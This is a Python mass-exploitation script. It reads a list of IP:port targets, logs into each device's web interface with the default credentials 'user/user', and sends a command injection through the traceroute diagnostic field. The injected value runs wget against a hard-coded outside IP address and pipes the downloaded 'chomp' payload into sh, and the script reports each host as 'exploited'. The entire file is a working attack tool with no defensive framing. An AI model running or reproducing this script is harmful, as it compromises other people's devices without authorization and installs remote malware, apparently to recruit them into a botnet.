import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import Timeout
from concurrent.futures import ThreadPoolExecutor

# Suppress all warnings for simplicity
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def perform_login_request(ip_port):
    url_login = f"http://{ip_port}/goform/websLogin"
    headers_login = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36",
        "Connection": "close",
    }
    data_login = {"user_name": "user", "password": "user"}

    try:
        response_login = requests.post(url_login, headers=headers_login, data=data_login, verify=False, allow_redirects=False, timeout=5)
        asp_session_id_cookie = response_login.cookies.get("ASPSSIONID")

        if asp_session_id_cookie:
            print(f"found {ip_port} ", asp_session_id_cookie)

            url_traceroute = f"http://{ip_port}/goform/tracerouteTest?FormRet=/diagnosis/diagnosis.asp"
            headers_traceroute = {
                "Cookie": f"ASPSSIONID={asp_session_id_cookie}",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36",
                "Connection": "close",
            }

            data_traceroute = {"netdiag_traceroute_dst": ";$(wget http://45.95.146.126/chomp -O-|sh)", "netdiag_traceroute_interface": "eth2.1"}

            try:
                response_traceroute = requests.post(url_traceroute, headers=headers_traceroute, data=data_traceroute, verify=False, timeout=5)

                if response_traceroute.status_code == 200:
                    print(f"exploited {ip_port}.")

            except Timeout:
                pass  # Do nothing for timeouts in the second request

    except Timeout:
        pass  # Do nothing for timeouts in the login request


# Read IP:PORT from ips.txt
with open("ips.txt", "r") as file:
    ip_ports = file.read().splitlines()

# Use ThreadPoolExecutor with max_workers=10
with ThreadPoolExecutor(max_workers=10) as executor:
    # Submit each host for concurrent execution
    executor.map(perform_login_request, ip_ports)
